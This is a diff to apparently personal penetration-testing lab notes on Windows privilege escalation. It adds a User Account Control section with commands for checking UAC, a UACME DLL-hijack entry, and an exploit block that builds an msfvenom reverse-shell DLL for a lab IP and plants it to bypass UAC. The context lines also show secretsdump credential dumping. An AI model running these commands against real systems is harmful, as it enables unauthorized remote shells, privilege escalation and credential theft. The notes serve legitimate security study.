@@ -20,7 +20,8 @@
     - [RCE: Manual way no GUI](#rce-manual-way-no-gui)
     - [RCE: Automated](#rce-automated)
   - [Server Operators](#server-operators)
-    - [RCE](#rce-2)      
+    - [RCE](#rce-2)
+  - User Account Control      
 
 
 # Windows User Privileges
@@ -441,5 +442,75 @@ crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'
 secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator
 ```
 
+# User Account Control
+- [How User Account Control works](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/user-account-control/how-it-works)
+- [User Account Control settings and configuration](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/user-account-control/settings-and-configuration?tabs=intune)
+- [The UACME project maintains a list of UAC bypasses](https://github.com/hfiref0x/UACME)
 
+## Check
+
+```powershell
+
+whoami /user
+net localgroup administrators
+whoami /priv
+
+
+
+# Confirming UAC is Enabled
+REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
+
+# Checking UAC Level
+REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
+
+
+# Checking Windows Version
+[environment]::OSVersion.Version
+
+```
+then we could check [UACME list](https://github.com/hfiref0x/UACME?tab=readme-ov-file#usage)
+
+## technique number 54 example 
+```
+Author: egre55
+Type: Dll Hijack
+Method: Dll path search abuse
+Target(s): \syswow64\SystemPropertiesAdvanced.exe and other SystemProperties*.exe
+Component(s): \AppData\Local\Microsoft\WindowsApps\srrstr.dll
+Implementation: ucmEgre55Method
+Works from: Windows 10 (14393)
+Fixed in: Windows 10 19H1 (18362)
+  How: SysDm.cpl!_CreateSystemRestorePage has been updated for secured load library call
+
+
+
+When attempting to locate a DLL, Windows will use the following search order.
+1) The directory from which the application loaded.
+2) The system directory C:\Windows\System32 for 64-bit systems.
+3) The 16-bit system directory C:\Windows\System (not supported on 64-bit systems)
+4) The Windows directory.
+5) Any directories that are listed in the PATH environment variable.
+
+
+```
+
+## Exploit 
+```powrershell
+
+# Reviewing Path Variable
+cmd /c echo %PATH%
+
+# Generating Malicious srrstr.dll DLL (from linux)
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll
+
+# deliver to victim host and place it in an PATH env
+
+# Testing Connection
+rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll
+
+# Executing SystemPropertiesAdvanced.exe on Target Host
+C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
+
+
+```
 
